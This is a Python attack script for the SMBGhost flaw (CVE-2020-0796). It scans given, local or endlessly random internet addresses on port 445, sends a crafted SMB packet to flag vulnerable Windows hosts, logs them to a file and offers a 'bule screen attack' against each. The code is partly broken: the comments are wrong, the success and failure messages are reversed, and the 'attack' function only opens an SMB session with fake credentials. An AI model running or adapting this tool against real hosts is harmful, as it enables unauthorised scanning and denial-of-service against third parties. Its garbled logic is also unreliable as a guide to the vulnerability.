#!/usr/bin/python3
import socket #socket module, send and receive data
from random import randint as rand #random module is used to generate a random number
from time import sleep #time module is used to generate a random number
import struct #dec0de binary data
import os #operation system module is used to get the operating system of the target machine
import sys #sys module is used to get the operating system of the target machine
from netaddr import IPNetwork #network address module is used to get the operating system of the target machine
from smbprotocol.connection import Connection #smbprotocol module is used to get the operating system of the target machine
from smbprotocol.session import Session #smbprotocol module is used to get the operating system of the target machine
import uuid #uuid module is used to get the operating system of the target machine
import re #re module is used to get the operating system of the target machine
def showIP():
    packet = """
GET /ip HTTP/1.1
Host: ifconfig.me
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6,zh;q=0.5

GET /favicon.ico HTTP/1.1
Host: ifconfig.me
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://ifconfig.me/ip
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6,zh;q=0.5"""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:
        sock.connect(("34.117.59.81",80))
        sock.send(bytes(packet.encode()))
        un, = struct.unpack("!H", sock.recv(2))
        recv_ = sock.recv(un)
        data = recv_.decode()
        try:
            return re.search(r"\d+\.\d+\.\d+\.\d+",data).group()
        except:
            return re.search(r"\d+\.\d+\.\d+\.\d+",data)

def bule_screen(IP, username=None, password=None, port=445, encode=None, connectionTimeout=10):
    _SMB_CONNECTIONS = {}
    connection_key = "%s:%s" %(IP, port)
    connection = _SMB_CONNECTIONS.get(connection_key, None)
    if not connection:
        connection = Connection(uuid.uuid4(), IP, port)
        connection.connect(timeout=connectionTimeout)
        _SMB_CONNECTIONS[connection_key] = connection
    session = next((s for s in connection.session_table.values() if username is None or s.username == username), None)
    if not session:
        session = Session(connection, username=username, password=password, require_encryption=(encode is True))
        session.connect()
    elif encode is not None:
        if session.encrypt_data and not encode:
            print("[\033[33m-\033[0m]Cannot disable encryption on an already negotiated session.")
        elif not session.encrypt_data and encode:
            session.encrypt = True
    return session
def test_host(IP):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        status = sock.connect_ex((str(IP),445))
        if status == 0:
            print("[\033[31m-\033[0m]THE ATTACK MAY FALI, BUT THE HOST OF THE OTHER PARTY IS STIALL ALIVE")
        else:
            print("[\033[32minfo\033[0m]THE ATTACK WAS SUCCESSFUL, BUT THE OTHER PARTY DID NOT RESPOND")
def randomIP():
    return ("%d.%d.%d.%d"%(rand(0,255),rand(0,255),rand(0,255),rand(0,255)));
def mode():
    try:
        SMBL = ("""\033[32m
    |CVE-2020-0796 SMBGhost|    |your IP:%s|
\033[0m"""%(showIP()))
        if len(sys.argv) == 1:
            print(SMBL)
            a = input("[\033[34minfo\033[0m]WHETHER TO ACTIVATE AUTOMATIC MODE? (y/n/exit)#")
            if a == "exit":
                exit(0)
            if a == "n" or a == "N" or a == "NO" or a == "no":
                while 1:
                    ip = input("[\033[34minfo\033[0m]ENTER IP#")
                    if ip == "help" or ip == "HELP":
                        print("""
command:
        local -- scan localnetwork
        help -- help
        exit -- exit program
""")
                    if ip == "exit" or ip == "EXIT":
                        exit(0);
                    else:
                        main(ip)
                    if ip == "local" or ip == "LOCAL":
                        for local in IPNetwork(socket.gethostbyname(socket.gethostname())+"/24"):
                            main(str(local))
                    else:
                        main(ip)
            elif a == "y" or a == "Y" or a == "yes" or a == "YES":
                while 1:
                    main(randomIP())
                    sleep(1)
                    continue
            else:
                print("[\033[31m-\033[0m]INPUT ERROR,PLEASE CHECK THE INPUT")
        else:
            argv_IP = sys.argv[1]
            print(SMBL)
            if argv_IP == "local" or argv_IP == "LOCAL":
                for IP_ in IPNetwork(socket.gethostbyname(socket.gethostname())+"/24"):
                    main(str(IP_))
            elif argv_IP == "help" or argv_IP == "HELP":
                print(r"""
command:
        local -- scan localnetwork
        help -- help
        ip address -- Scan the specified IP
""")
            elif argv_IP == "exit" or argv_IP == "EXIT":
                exit(0)
            else:
                main(argv_IP)
    except KeyboardInterrupt:
        print("[\033[31m-\033[0m]byebye")
def main(IP):
    try:
        port=445 #default port
        with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as sock: #create socket,AF_INET is IPv4,SOCK_STREAM is TCP
            sock.settimeout(5)
            scan = sock.connect_ex((IP,port)) #testing port status
            if scan == 0: #if port is open or filtered,then print the IP
                print("[\033[32minfo\033[0m]IP %s --- PORT 445 OPEN/FILTRTED"% IP)
                with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as smb:
                    smb.settimeout(30)
                    try:
                        smb.connect((IP, port)) #connect to the target
                    except: #if connect failed,then print the IP
                        smb.close()
                    smb.send(b'\x00\x00\x00\xc0\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x00\x08\x00\x01\x00\x00\x00\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00x\x00\x00\x00\x02\x00\x00\x00\x02\x02\x10\x02"\x02$\x02\x00\x03\x02\x03\x10\x03\x11\x03\x00\x00\x00\x00\x01\x00&\x00\x00\x00\x00\x00\x01\x00 \x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\n\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00') #send vulnerable SMB payload
                    b, = struct.unpack(">I", smb.recv(4)) #decode binary data 
                    recv = smb.recv(b) #receive data
                    exploitCheck = (b"\x11\x03\x02\x00")
                    if recv[68:72] != exploitCheck: #if the data is not vulnerable,then print the IP
                        print("[\033[31m-\033[0m]IP %s Not Vulnerable"% IP) #if receive data is not vulnerable,then print the IP
                    elif recv[68:72] == exploitCheck: 
                        print("[\033[32minfo\033[0mIP %s Vulnerable"% IP) #if the data is vulnerable,then print the IP
                        exp=input("[\033[33minfo\033[0m]bule screen attack(Y/n)#")
                        if exp == "Y" or exp == "y":
                            bule_screen(IP, username="fakeuser", password="fakepass", encode=False);test_host(IP)
                        elif exp == "N" or exp == "n":
                            pass
                        with open(os.getcwd()+"/cve_2020_0796-host.txt",mode="a") as f: #write the IP to the file
                            for i in "%s"%(IP): #write the IP to the file
                                f.write(i) #write the IP to the file
                            f.close()
            else: #if port is not open or filtered,then print the IP
                print("[\033[31m-\033[0m]IP %s PARTY DID NOT OPEN PORT 445"% IP) #if port is not open,then print the IP
    except KeyboardInterrupt: #if user interrupt,print error
        print("[\033[33m-\033[0m]byebye!")
        exit(1) #exit
    except ConnectionResetError: #if connection reset,print error
        print("[\033[33m-\033[0m]PLEASE CHECK IF THE INTERNET PROTOCOL YOU ENTERED IS CORRECT")
    except socket.gaierror:
        print("[\033[33m-\033[0m]PLEASE CHECK IF THE INTERNET PROTOCOL YOU ENTERED IS CORRECT")
    except socket.timeout:
        print("[\033[33m-\033[0m]CONNECTION THE SERVER TIMEOUT")

if __name__ == "__main__":
    mode()
